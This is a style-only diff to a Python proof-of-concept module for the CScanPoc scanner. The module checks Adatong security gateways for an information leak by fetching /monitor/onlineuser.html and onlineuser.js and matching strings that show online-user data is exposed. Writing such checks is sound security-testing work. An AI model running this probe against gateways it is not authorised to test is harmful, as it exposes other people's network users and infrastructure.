@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'ADTsec_0014'  # 平台漏洞编号，留空
     name = '安达通安全网关 信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         SJW74系列安全网关 和 全网行为管理TPN-2G安全网关 在线用户。
@@ -36,6 +37,7 @@ class Vuln(ABVuln):
     product = '安达通安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'e58b934b-ebc6-4708-98a7-e30017305739'
     author = '47bwy'  # POC编写者
@@ -54,9 +56,10 @@ class Poc(ABPoc):
             url = arg + '/monitor/onlineuser.html'
             code2, head, res, errcode, _ = hh.http(url)
             if 'onlineuser.js' in res:
-                code2, head, res, errcode, _ = hh.http(arg + '/monitor/onlineuser.js' )
+                code2, head, res, errcode, _ = hh.http(
+                    arg + '/monitor/onlineuser.js')
                 if 'var userFlow,selText,selId,ip,Vlan_id' in res and 'URL_LOG_ONLINEUSER' in res and 'sslvpn/ssl_list' in res:
-                    #security_warning(url)
+                    # security_warning(url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -65,6 +68,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
